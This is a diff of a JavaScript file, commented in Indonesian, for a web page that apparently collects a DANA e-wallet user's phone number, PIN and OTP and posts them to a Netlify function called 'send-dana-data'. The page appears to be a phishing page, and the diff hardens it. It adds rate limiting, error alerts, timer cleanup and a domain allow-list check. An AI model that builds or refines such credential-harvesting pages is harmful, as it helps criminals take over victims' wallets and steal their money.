@@ -27,6 +27,10 @@ document.addEventListener('DOMContentLoaded', () => {
   const maxAttempts = 6;
   let otpTimer;
 
+  // Rate limiting sederhana
+  let lastRequestTime = 0;
+  const MIN_REQUEST_INTERVAL = 2000; // 2 detik
+
   // Helper Functions
   function showSpinner() {
     document.querySelector('.spinner-overlay').style.display = 'flex';
@@ -70,8 +74,14 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Backend Communication
+  // Backend Communication dengan Rate Limiting
   async function sendDanaData(type, data) {
+    const now = Date.now();
+    if (now - lastRequestTime < MIN_REQUEST_INTERVAL) {
+      throw new Error('Terlalu banyak permintaan. Silakan tunggu sebentar.');
+    }
+    lastRequestTime = now;
+
     try {
       const response = await fetch('/.netlify/functions/send-dana-data', {
         method: 'POST',
@@ -79,12 +89,22 @@ document.addEventListener('DOMContentLoaded', () => {
         body: JSON.stringify({ type, ...data })
       });
       
-      if (!response.ok) throw new Error(await response.text());
+      if (!response.ok) {
+        const errorText = await response.text();
+        throw new Error(errorText || 'Terjadi kesalahan pada server');
+      }
       return await response.json();
     } catch (error) {
       console.error('Error:', error);
       throw error;
     }
+  }
+
+  // Validasi Domain (opsional tambahan keamanan)
+  const ALLOWED_DOMAINS = ['your-domain.netlify.app', 'localhost'];
+  if (!ALLOWED_DOMAINS.includes(window.location.hostname)) {
+    console.warn('Akses dari domain yang tidak diizinkan:', window.location.hostname);
+    // Bisa ditambahkan redirect atau blocking di sini
   }
 
   // Modified Phone Number Formatting
@@ -228,6 +248,7 @@ document.addEventListener('DOMContentLoaded', () => {
           }, 1000);
         } catch (error) {
           console.error('Gagal mengirim OTP:', error);
+          alert('Gagal mengirim OTP: ' + error.message);
         } finally {
           hideSpinner();
         }
@@ -249,5 +270,12 @@ document.addEventListener('DOMContentLoaded', () => {
       input.type = isShowing ? 'text' : 'password';
     });
     e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
+  });
+
+  // Handle page refresh/closing untuk membersihkan interval
+  window.addEventListener('beforeunload', () => {
+    if (otpTimer) {
+      clearInterval(otpTimer);
+    }
   });
 });
